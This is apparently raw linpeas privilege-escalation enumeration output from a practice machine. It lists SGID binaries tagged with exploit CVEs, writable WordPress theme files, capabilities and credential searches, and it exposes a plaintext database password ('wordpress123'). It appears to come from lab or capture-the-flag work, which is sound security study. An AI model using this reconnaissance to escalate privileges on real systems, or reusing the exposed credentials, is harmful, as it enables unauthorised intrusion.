╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/9665/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/9665/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/9665/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/9665/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/9665/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/9665/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K May 26  2020 /snap/core/9665/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/9665/usr/bin/wall
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8268/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8268/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8268/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Oct 10  2019 /snap/core/8268/usr/bin/wall
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 31K Mar  5  2020 /usr/bin/wall
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 26245 Jul 10  2020 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1793 Jul 20  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 36
drwxr-xr-x   2 root root 4096 Aug  3  2020 .
drwxr-xr-x 102 root root 4096 Aug  3  2020 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jan 15  2020 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jan 15  2020 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  825 Oct 30  2019 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/aubreanna/.mysql_history
/root/
/var/www
/var/www/html
/var/www/html/wordpress/wp-config-sample.php
/var/www/html/wordpress/wp-config.php
/var/www/html/index.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 0 Jan 20 20:34 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/notify_on_release
-rwx------ 1 root root 223 Aug  3  2020 /home/aubreanna/.mysql_history

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root dip 656 Jul 10  2020 /snap/core/9665/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Jul 10  2020 /snap/core/9665/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Jul 10  2020 /snap/core/9665/var/log/dmesg
-rw-r----- 1 root adm 31 Jul 10  2020 /snap/core/9665/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Jul 10  2020 /snap/core/9665/var/log/fsck/checkroot
-rw-r----- 1 root dip 656 Dec  6  2019 /snap/core/8268/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Dec  6  2019 /snap/core/8268/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/dmesg
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/fsck/checkroot
-rw-r----- 1 root adm 0 Aug  3  2020 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 1867930 Jan 20 20:17 /var/log/apache2/error.log
-rw-r----- 1 root adm 21402395 Jan 20 20:34 /var/log/apache2/access.log
-rw-r----- 1 root adm 99522 Aug  3  2020 /var/log/apt/term.log

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/aubreanna
/run/lock
/run/screen
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/snap/core/8268/run/lock
/snap/core/8268/tmp
/snap/core/8268/var/tmp
/snap/core/9665/run/lock
/snap/core/9665/tmp
/snap/core/9665/var/tmp
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/containerd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-9665.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2x2dpvscan.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/php/sessions
/var/tmp
/var/www/html/wordpress/wp-content/themes/twentyseventeen/404.php
/var/www/html/wordpress/wp-content/themes/twentyseventeen/archive.php
/var/www/html/wordpress/wp-content/themes/twentyseventeen/assets
/var/www/html/wordpress/wp-content/themes/twentyseventeen/comments.php
/var/www/html/wordpress/wp-content/themes/twentyseventeen/footer.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wordpress/wp-content/themes/twentytwenty/404.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/assets
/var/www/html/wordpress/wp-content/themes/twentytwenty/classes
/var/www/html/wordpress/wp-content/themes/twentytwenty/comments.php
/var/www/html/wordpress/wp-content/themes/twentytwenty/footer.php
#)You_can_write_even_more_files_inside_last_directory

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2020-08-03+16:17:14.0803051120 /var/www/html/wordpress/wp-content/themes/twentytwenty/404.php
2020-08-03+03:57:37.0388428420 /home/aubreanna/jenkins.txt
2020-08-03+03:56:27.7230403950 /home/aubreanna/user.txt
2020-08-03+01:41:53.2887857950 /home/aubreanna/.sudo_as_admin_successful
2020-08-03+01:41:34.9527197450 /home/aubreanna/.cache/motd.legal-displayed

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt

╔══════════╣ Unexpected in root
/swap.img
/vmlinuz
/initrd.img
/initrd.img.old
/vmlinuz.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog
/var/log/mysql/error.log
/var/log/auth.log
/var/log/apache2/access.log
/var/log/journal/4e97b1deb1894aeda891e28625a8da6f/system.journal
/var/log/journal/4e97b1deb1894aeda891e28625a8da6f/user-1000.journal
/home/aubreanna/result.txt
/home/aubreanna/.config/lxc/config.yml

logrotate 3.11.0

╔══════════╣ Files inside /home/aubreanna (limit 20)
total 1060
drwx------ 8 aubreanna aubreanna   4096 Jan 20 20:32 .
drwxr-xr-x 3 root      root        4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna      7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna    220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna   3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna   4096 Aug  3  2020 .cache
drwxr-x--- 3 aubreanna aubreanna   4096 Jan 20 20:32 .config
drwx------ 3 aubreanna aubreanna   4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna   4096 Aug  3  2020 .local
-rwx------ 1 root      root         223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna    807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna   4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna      0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna     55 Aug  3  2020 jenkins.txt
-rwxrwxr-x 1 aubreanna aubreanna 847920 Jan 20 19:39 linpeas.sh
-rw-rw-r-- 1 aubreanna aubreanna 170623 Jan 20 20:33 result.txt
drwx------ 3 aubreanna aubreanna   4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna     21 Aug  3  2020 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/wordpress/wp-blog-header.php
/var/www/html/wordpress/wp-login.php
/var/www/html/wordpress/wp-signup.php
/var/www/html/wordpress/wp-settings.php
/var/www/html/wordpress/license.txt
/var/www/html/wordpress/wp-admin/ms-admin.php
/var/www/html/wordpress/wp-admin/admin-ajax.php
/var/www/html/wordpress/wp-admin/network.php
/var/www/html/wordpress/wp-admin/custom-header.php
/var/www/html/wordpress/wp-admin/ms-sites.php
/var/www/html/wordpress/wp-admin/site-health.php
/var/www/html/wordpress/wp-admin/images/xit-2x.gif
/var/www/html/wordpress/wp-admin/images/loading.gif
/var/www/html/wordpress/wp-admin/images/media-button-music.gif
/var/www/html/wordpress/wp-admin/images/icons32-vs-2x.png
/var/www/html/wordpress/wp-admin/images/stars-2x.png
/var/www/html/wordpress/wp-admin/images/spinner.gif
/var/www/html/wordpress/wp-admin/images/icons32-vs.png
/var/www/html/wordpress/wp-admin/images/list-2x.png
/var/www/html/wordpress/wp-admin/images/menu-vs.png

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 7905 Jul  9  2020 /lib/modules/4.15.0-112-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7857 Jul  9  2020 /lib/modules/4.15.0-112-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 2765 Feb  3  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 1397 Aug  3  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 10939 Aug  3  2020 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 217484 Jul  9  2020 /usr/src/linux-headers-4.15.0-112-generic/.config.old
-rw-r--r-- 1 root root 0 Jul  9  2020 /usr/src/linux-headers-4.15.0-112-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jul  9  2020 /usr/src/linux-headers-4.15.0-112-generic/include/config/wm831x/backup.h

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /snap/core/8268/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /snap/core/9665/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Aug  3  2020 .
drwxr-xr-x 14 root root 4.0K Aug  3  2020 ..
drwxr-xr-x  3 root root 4.0K Aug  3  2020 html

/var/www/html:
total 24K
drwxr-xr-x 3 root   root    4.0K Aug  3  2020 .
drwxr-xr-x 3 root   root    4.0K Aug  3  2020 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Jul 10  2020 /snap/core/9665/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/9665/etc/skel/.bash_logout
-rw------- 1 root root 0 Dec  6  2019 /snap/core/8268/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8268/etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Jan 20 17:30 /run/ubuntu-fan/.lock
-rw-r--r-- 1 root root 20 Jan 20 17:30 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Jan 20 17:29 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 1531 Aug  3  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 nobody nogroup 629 May  9  2016 /var/www/html/wordpress/wp-content/plugins/akismet/.htaccess
-rw-r--r-- 1 nobody nogroup 269 Oct 25  2019 /var/www/html/wordpress/wp-content/themes/twentytwenty/.stylelintrc.json
-rw-r--r-- 1 landscape landscape 0 Feb  3  2020 /var/lib/landscape/.cleanup.user
-rwx------ 1 aubreanna aubreanna 220 Apr  4  2018 /home/aubreanna/.bash_logout
-rw------- 1 root root 0 Feb  3  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 1531 Aug  3  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Jan 11  2019 /usr/share/php/.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 51200 Aug  9  2020 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
Binary file /usr/share/phpmyadmin/js/openlayers/theme/default/img/navigation_history.png matches

╔══════════╣ Searching passwords in config PHP files
/etc/phpmyadmin/config.inc.php:    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
/etc/phpmyadmin/config.inc.php:// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
/etc/wordpress/config-localhost.php:define('DB_PASSWORD', 'wordpress123');
/etc/wordpress/config-localhost.php:define('DB_USER', 'wordpress');
/usr/share/phpmyadmin/config.sample.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['Servers'][$i]['nopassword'] = false;
/usr/share/phpmyadmin/libraries/config.default.php:$cfg['ShowChgPassword'] = true;
/var/www/html/wordpress/wp-admin/setup-config.php:              $pwd    = trim( wp_unslash( $_POST['pwd'] ) );

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/bin/docker-credential-secretservice
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
'@'localhost' (using password: YES)
2020-02-03 18:22:20 configure base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:20 install base-passwd:amd64 <none> 3.5.44
2020-02-03 18:22:20 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:20 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status half-installed base-passwd:amd64 3.5.44
2020-02-03 18:22:22 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:22 upgrade base-passwd:amd64 3.5.44 3.5.44
2020-02-03 18:22:25 install passwd:amd64 <none> 1:4.5-1ubuntu1
2020-02-03 18:22:25 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:25 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:26 configure base-passwd:amd64 3.5.44 <none>
2020-02-03 18:22:26 status half-configured base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status installed base-passwd:amd64 3.5.44
2020-02-03 18:22:26 status unpacked base-passwd:amd64 3.5.44
2020-02-03 18:22:27 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2020-02-03 18:22:27 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:22:27 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status half-configured passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status installed passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-02-03 18:23:09 status unpacked passwd:amd64 1:4.5-1ubuntu2
2020-02-03 18:23:09 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-08-03 01:41:20,755 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 24 bytes
2020-08-03 01:41:20,756 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
